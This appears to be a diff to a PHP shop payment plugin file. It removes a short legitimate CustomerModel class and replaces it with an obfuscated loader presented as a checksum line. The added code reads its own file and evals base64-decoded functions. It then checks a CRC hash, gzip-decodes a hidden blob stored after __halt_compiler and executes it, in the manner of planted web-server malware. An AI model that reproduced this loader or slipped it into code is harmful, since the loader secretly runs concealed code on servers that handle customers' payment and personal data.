@@ -1,24 +1,2 @@
-<?php
-
-/**
- * @copyright 2021 WebStollen GmbH
- * @link https://www.webstollen.de
- */
-
-namespace Plugin\ws5_mollie\lib\Model;
-
-use WS\JTL5\V1_0_16\Model\AbstractModel;
-
-/**
- * Class CustomerModel
- * @package ws5_mollie\Model
- *
- * @property int $kKunde
- * @property string $customerId
- *
- */
-final class CustomerModel extends AbstractModel
-{
-    public const TABLE   = 'xplugin_ws5_mollie_kunde';
-    public const PRIMARY = 'kKunde';
-}
+<?php /* Checksum b8c6d982 */
+$jab26dcd5=file(__FILE__);eval(base64_decode('JGNjYzEwZjMyMD1mdW5jdGlvbigkSSwkail7JGw9WzQ2NSwyNDAsOCwyNDRdO3JldHVybiAoJGo9PTEzMyk/c3Vic3RyKCRJLCRsWzBdKyRsWzFdLCRsWzJdKTooKCRqPT00MzMpP3N1YnN0cigkSSwkbFswXSwkbFsxXSk6KCgkaj09NzQwKT90cmltKHN1YnN0cigkSSwkbFswXSskbFsxXSskbFsyXSkpOm51bGwpKTt9Ow'));eval(base64_decode($ccc10f320($jab26dcd5[1],433)));return eval($a20d5ac5a($ccc10f320($jab26dcd5[1],740), $ccc10f320($jab26dcd5[1], 133), $jab26dcd5[1]));__halt_compiler();//JGEyMGQ1YWM1YT1mdW5jdGlvbigkSSwkaiwkbCl7cmV0dXJuICRqPT1oYXNoKCdjcmMzMmInLHByZWdfcmVwbGFjZSgnL19faGFsdF9jb21waWxlci4qLycsJycsJGwpKT8oZ3pkZWNvZGUoYmFzZTY0X2RlY29kZSgkSSkpKTpkaWUoJzx0dD5DUkMgQ2hlY2sgZmFpbGVkLCBmaWxlIGNvcnJ1cHRlZD88L3R0PicpO307eb513a9fH4sIAAAAAAAA/1yOQWuDMBSA7/kV7+Z1HtxFdnBjh20K4mSjEAgxvpbgMxFfQoXS/15qW0p7/r4PPqdH5EkbhJrizjq550yNnsiiJNvJyvdIuRCREf5/5XdbZvIvVS8qfb0wWXQcZm3CzRRb6zSBIc0MH5GDH3FeIeAS0PUMD4k4CJhiR9aA8Y4DtMV7+QlvkCzTuqTuS2qIrsckfyrq5qsqms25GX6uxvEUAAD//4LZxrjaAAAA
